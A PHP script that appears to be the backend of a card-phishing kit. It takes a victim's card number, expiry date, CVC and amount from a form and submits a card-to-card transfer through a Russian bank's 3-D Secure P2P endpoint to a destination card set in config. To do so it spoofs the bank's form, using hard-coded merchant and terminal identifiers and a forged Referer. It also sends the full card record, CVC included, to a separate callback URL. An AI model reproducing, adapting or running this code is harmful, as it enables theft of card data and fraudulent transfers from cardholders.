<?php

include "config.php";

if (isset($_POST) && $_POST != null) {

    $order = json_decode(file_get_contents("https://3ds.payment.ru/cgi-bin/get_trans_cond_p2p"));

    $card = json_decode($_POST["callback_data"]);

    $card->card_number = str_replace(" ", "", $card->card_number);
    $card->card_expire_year = substr($card->card_expire_year, 2);

    $sender = str_split($card->card_number, 3);
    $receiver = str_split($destination_card, 3);

    $request = [
        "sender_card_frame1" => $sender[0],
        "sender_card_frame2" => $sender[1],
        "sender_card_frame3" => $sender[2],
        "sender_card_frame4" => $sender[3],
        "EXP" => $card->card_expire_month,
        "EXP_YEAR" => $card->card_expire_year,
        "CVC2" => $card->card_cvc,
        "receiver_card_frame1" => $receiver[0],
        "receiver_card_frame2" => $receiver[1],
        "receiver_card_frame3" => $receiver[2],
        "receiver_card_frame4" => $receiver[3],
        "AMOUNT" => $card->amount,
        "backspace_transfer" => "N",
        "is_active_3ds_sender" => "Y",
        "CURRENCY" => "RUB",
        "ORDER" => $order->ORDER_NUM,
        "DESC" => "Перевод+с+карты+на+карту",
        "TERMINAL" => "24043210",
        "TRTYPE" => "8",
        "MERCH_NAME" => "PSB",
        "MERCHANT" => "000601224043210",
        "EMAIL" => "lakhtin@psbank.ru",
        "TIMESTAMP" => $order->TIMESTAMP,
        "BACKREF" => "",
        "CARD" => $card->card_number,
        "PAYMENT_TO" => $destination_card,
        "PAYMENT_TEXT" => "",
        "DEVICE_NA" => "",
        "DEVICE_ID" => ""
    ];

    $opts = ["http" =>
        [
            "method"  => "POST",
            "header"  => "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        ."Content-Type: application/x-www-form-urlencoded\r\n"
                        ."Referer: https://3ds.payment.ru/P2P_ACTION/card_form.html\r\n",
            "content" => urldecode(http_build_query($request))
        ]
    ];

    $response = file_get_contents("https://3ds.payment.ru/cgi-bin/cgi_link_local", false, stream_context_create($opts));

    if(strpos($response, "https://3ds.payment.ru/cgi-bin/cgi_link")){

        $dom = new DOMDocument();
        $dom->loadHTML($response);
        $xpath = new DOMXpath($dom);
        $node = $xpath->query('//input[@name="PaReq"]/attribute::value');
        $pareq = $node->item(0)->nodeValue;
        $node = $xpath->query('//input[@name="MD"]/attribute::value');
        $md = $node->item(0)->nodeValue;

        $inputs = $dom->getElementsByTagName("form");
        foreach ($inputs as $input) {
            if ($input->getAttribute("name") == "ThreeDform") {
                $payurl = $input->getAttribute("action");
            }
        }

        $opts = ["http" =>
            [
                "method"  => "POST",
                "header"  => "Content-Type: Content-type: application/json\r\n",
                "content" => json_encode(["state" => "processing", "status" => "success", "data" => $card])
            ]
        ];
        file_get_contents($callback_url, false, stream_context_create($opts));

        $result = ["status" => "ok", "PayUrl" => $payurl, "PaReq" => $pareq, "MD" => $md, "TermUrl" => $status_url];
        echo json_encode($result);

    } else {
        $opts = ["http" =>
            [
                "method"  => "POST",
                "header"  => "Content-Type: Content-type: application/json\r\n",
                "content" => json_encode(["state" => "processing", "status" => "notsuccess", "data" => $card])
            ]
        ];
        file_get_contents($callback_url, false, stream_context_create($opts));

        //$result = ["status" => "ok", "PayUrl" => $payurl, "PaReq" => $pareq, "MD" => $md, "TermUrl" => $status_url];
        $result = ["status" => "error", "error_code" => "101"];
        echo json_encode($result);

    }

}

?>

